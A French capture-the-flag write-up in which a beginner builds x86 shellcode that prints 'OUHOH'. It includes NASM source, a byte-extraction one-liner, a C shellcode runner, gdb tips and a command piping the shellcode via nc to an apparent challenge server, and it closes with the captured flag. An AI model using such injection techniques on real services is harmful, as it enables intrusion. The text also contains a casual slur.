@@ -1,0 +1,114 @@
+Ce chall est du shellcoding, j'en ai jamais fait mais j'ai lu quelques docs.
+
+On doit lire un fichier donc on peut soit exécuter cat, soit faire un read en shellcoding, soit se faire pop un shell.
+
+On va utiliser gdb pour cette magie noire avec pwntools, ça va être bien.
+Si jéjé tu lis ce WU, je vais essayer de faire mon propre shellcode, j'espère que tu pardonneras mon utilisation de template pour la ROP.
+
+Bon parce-que j'ai envie d'apprendre, même si ça va me prendre énormément de temps, je décide de commencer par essayer de faire un shellcode qui lit un fichier et affiche son contenu.
+Je vois donc plusieurs étapes j'imagine en assembleur: Ouvrir le fichier avec les bons droits, lire son contenu jusqu'à la fin, afficher son contenu.
+
+Vu que je débute, je vais faire la dernière étape qui est afficher son contenu, mais je vais plutôt afficher la chaîne de caractères: "OUHOH".
+
+Les bases:
+
+J'ai appris quelques règles sur le shellcoding en lisant de la doc, la première c'est qu'il faut à tout prix éviter d'avoir des 00 dans son shellcode à la fin, il faut utiliser des tips pour les enlever.
+Lorsqu'on a en instruction l'int 0x80, le CPU passe en kernel mode et ça exécute la fonction syscall.
+Le syscall number doit être dans EAX, les arguments sont dans les autres registres.
+Si on veut exécuter un exit(0) par exemple, il suffit de faire un: "mov 0x0, ebx" puis un "move 0x1, eax" car eax contient le syscall number de exit qui est 1, puis on a notre "int 0x80".
+Mais comme je l'ai dit juste avant notre syscall ne doit pas contenir des 00, donc le "mov 0, ebx" va poser problème, le tips c'est de xor le registre avec lui même pour le faire passer à 0.
+On a donc: "xor ebx, ebx", puis pour le "move 1, eax" une fois en shellcode on peut voir qu'il fait pop des 00 aussi, or on peut utiliser le registre AL qui est la partie basse de AX.
+On obtient: "mov al, 1", ce qui nous fait un magnifique: "xor ebx, ebx; mov al,1; int 0x80".
+Voilà les bases, en gros on utilise des tips pour retirer les 00 et on fait en sorte de bien remplir les bons registres pour lancer notre syscall, sans oublier de vider les registres au début.
+
+
+Maintenant qu'on sait ça, on va essayer de faire notre print. On va utiliser la fonction write, en faisant un file on peut savoir que le binaire a été compilé sur du x86, donc https://syscalls.w3challs.com/?arch=x86, et on voit comment appeler notre write.
+A noter que pour ne pas avoir de segfault si on ne boucle pas, il faut mettre un exit à la fin. Ici on en a pas forcément besoin.
+
+global _start
+
+_start:
+		jmp short ender
+
+		starter:
+		xor eax, eax ;on clear nos registres
+		xor ebx, ebx
+		xor ecx, ecx
+		xor edx, edx
+
+		mov al, 4 ;on met notre syscall number donc 4 pour write
+		mov bl, 1 ;on met la valeur de fd sur 1 pour avoir les output normaux et erreurs
+		pop ecx ;notre string doit etre dans ecx, or elle est sur la stack
+		mov dl, 5 ;dans dl on doit mettre la longueur de notre string
+		int 0x80 ;on syscall
+
+		ender:
+		call starter ;on call pour mettre sur la stack notre string
+		db 'OUHOH'
+
+On compile tout ça et on regarde objdump pour l'hex: nasm -f elf32 008shellcouding.s ; ld -m elf_i386 -o 008shellcouding 008shellcouding.o; objdump -d ./008shellcouding|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+On a: 
+\xeb\x17\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x4f\x55\x48\x4f\x48
+Je le lance, ça segfault, super l'ambiance. Je le lance avec gdb mon binaire directement, super ça fonctionne !! Bon c'est déjà ça ...
+Je me fais giga matrixer, je demande aux boss des shellcoding, mon but c'est d'apprendre c'est assez cool comme vuln.
+
+- Shinji me dit qu'il fait des push / pop pour ne pas avoir a reset les registres et gagner en longueur, et qu'on peut définir ses chaines de caractères en variables, c'est noté !
+
+- Sean, maitre AOE2 me dit d'utiliser gdb avec un shellcode runner avec des commandes de setup:
+"Comme commandes de setup tu fais :
+
+break main
+run
+display/10i $eip
+display/32xw $esp
+
+Et après tu fais "si" pour avancer d'un cran à chaque fois
+Le premier display te montre les 10 instructions après eip
+Le deuxième te montre le haut de la stack, pointé par esp
+Et après ça te dit de break sur main et de lancer le programme, si jamais un jour t'as besoin de lui passer des arguments tu peux faire "run arg1 arg2 ..."
+Si jamais t'as besoin d'inspecter la valeur d'un registre faire "i r eax" (ou le nom de ton registre)"
+
+Il me donne aussi un shellcode runner basique: 
+
+char code[] = "bytecode will go here!";
+int main(int argc, char **argv)
+{
+  int (*func)();
+  func = (int (*)()) code;
+  (int)(*func)();
+}
+
+- iHuggsy me dit que dans les registres il faut faire attention parce-que ce sont des adresses vers des strings et non pas le contenu directement
+
+Bon avec tout ça j'ai pas mal d'outils pour réussir mon premier shellcode !
+Je fais donc une nouvelle version de mon shellcode et je le run avec gdb comme l'a dit le dieu Sean. 
+Bon il crashe sur ma première instruction alors que c'est un xor ?!
+En fait il faut forcément utiliser python ou autre chose pour convertir la chaine hexa du shellcode. J'suis un énorme mongole ça risquait pas de fonctionner...
+On a donc:
+global _start
+
+_start:
+		jmp short ender
+
+		starter:
+		pop ecx ;notre string doit etre dans ecx, or elle est sur la stack
+		push 4
+		pop eax ;on met notre syscall number donc 4 pour write
+		push 1
+		pop ebx ;on met la valeur de fd sur 1 pour avoir les output normaux et erreurs
+		push 5
+		pop edx ;dans edx on doit mettre la longueur de notre string
+		int 0x80 ;on syscall
+
+		ender:
+		call starter ;on call pour mettre sur la stack notre string
+		db 'OUHOH'
+
+python2 -c 'print "\xeb\x0c\x59\x6a\x04\x58\x6a\x01\x5b\x6a\x05\x5a\xcd\x80\xe8\xef\xff\xff\xff\x4f\x55\x48\x4f\x48";' | nc 192.168.120.11 39341
+Super il boucle bien sur OUHOH !!
+
+Passons aux choses sérieuses, on va lire le fichier.
+J'ai découvert une nouvelle fonction: xchg !!
+J'ai finis mon shellcode, je le teste, il fonctionne, niquel !
+
+ESNA{pFH45YENBe32Uiqtkv08xPzoRWg167ms}
